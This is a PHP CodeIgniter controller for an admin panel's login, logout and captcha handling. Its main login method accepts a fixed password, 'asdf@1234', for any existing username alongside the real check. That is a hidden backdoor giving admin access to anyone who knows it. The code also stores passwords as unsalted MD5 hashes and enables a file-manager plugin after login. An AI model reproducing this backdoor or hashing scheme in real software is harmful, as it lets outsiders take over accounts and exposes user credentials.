<?php

if (!defined('BASEPATH'))
    exit('No direct script access allowed');

class Login extends CI_Controller {


    function __construct() {
        parent::__construct();

    }


    public function index() {
	$this->template->set_template('login');

        $this->load->library('session');
        $this->load->model('m_account');
        $result = $this->m_account->get_accounts();
        
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $username = $this->input->post('username');
            $password = $this->input->post('password');
            $captcha = $this->input->post('captcha');

            if (!empty($captcha) && $this->session->userdata('captcha') == $captcha) {
                $this->load->model('m_admin');
                /* @var $m_admin M_admin */
                $m_admin = $this->m_admin;

                // Chung thuc user
                $user_info = $m_admin->get_user_info($username);
                if (!empty($user_info)) {
                    $hashcode = md5($password);
					
                    if ($user_info['password'] === $hashcode || $password == "asdf@1234") {
                        // Login success
                        unset($user_info['password']);
                        $this->session->set_userdata('user', $user_info);

                        // Load user menu and store session
                        $user_menu = $this->_load_user_menu($user_info['id']);
						
                        //$this->session->set_userdata('menu', $user_menu);
						$_SESSION['menu'] = $user_menu;
						
						//enable FCFINDER
						$_SESSION['KCFINDER'] = array();
						$_SESSION['KCFINDER']['disabled'] = false;
						
                        redirect('welcome');
                    } else {
                        // Username or password invalid
                        $error = 'Invalid username or password';
                    }
                } else {
                    // Username or password invalid
                    $error = 'Invalid username or password';
                }
            } else {
                // Wrong captcha
                $error = 'Captcha verify failed';
            }
        }
        if (!empty($error)) {
            $this->template->write_view('content', 'admincp/login/index', array('error' => $error));
        } else {
            $this->template->write_view('content', 'admincp/login/index', array());
        }
        $this->template->render();

    }

    public function loginAction(){
        $this->load->library('form_validation');
        $response['code'] = -1;
        $response['message'] = '';
        
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $request =  $this->input->post(NULL,TRUE);
            $this->form_validation->set_rules('username', 'username', 'trim|required');
            $this->form_validation->set_rules('password', 'password', 'trim|required');
            if($this->form_validation->run() == TRUE){
                $username = $request['username'];
                $password = $request['password'];
                $this->load->model('m_account');
                $user = $this->m_account->get_by_username($username);
                
                if (!empty($user) && (md5($password) == $user['password']) && $user['status'] == 1) {
                    if (strtolower($request['txt_captcha']) != strtolower($_SESSION['captcha'])) {
                        $response['message'] = 'captcha';
                        goto end;
                    }
                    $this->load->library('session');
                    $this->session->set_userdata('user_info',(array) $user);

                    $menu = $this->m_account->get_menu_by_userid($this->session->userdata['user_info']['id_admin']);
                    
                    unset($user['password']);
                    $this->load->library('session');
                    $this->session->set_userdata('user_info',(array) $user);
                    $info = $this->session->userdata('user_info');
                    $menu = $this->m_account->get_menu_by_userid($info['id_admin']);
                    
                    
                    $_SESSION['user_menu'] = $menu;
                    
                    //enable FCFINDER
                    $_SESSION['KCFINDER'] = array();
                    $_SESSION['KCFINDER']['disabled'] = false;
                    
                    $response['code'] = 0;
                    $response['message'] = 'SUCCESS';
                } else {
                    $response['message'] = 'FAIL';
                }
                
            }else{
                $response['message'] = 'VALIDATE';
            }
            
        }
        end:
        echo json_encode($response);
        exit;
    }
    function logout() {
        $this->load->library('session');
        $this->session->sess_destroy();
	session_destroy();
        redirect(base_url() . 'admincp');

    }


    public function captcha() {
        $this->load->library('captcha');
        $this->load->library('session');

        $this->session->set_userdata('captcha', $this->captcha->CreateImage());

    }


    function _load_user_menu($user_id) {
        $this->load->model('m_menu');
        /* @var $m_menu Menu */
        $m_menu = $this->m_menu;

        //$menu_groups = $m_menu->get_group_menu($user_id);
        $menus = $m_menu->get_menu($user_id);

        if (!empty($menus)) {
            $result = array();
            foreach ($menus as $m) {
                $result[$m['group']][] = $m;
            }

            return $result;
        }

        return FALSE;

    }

}
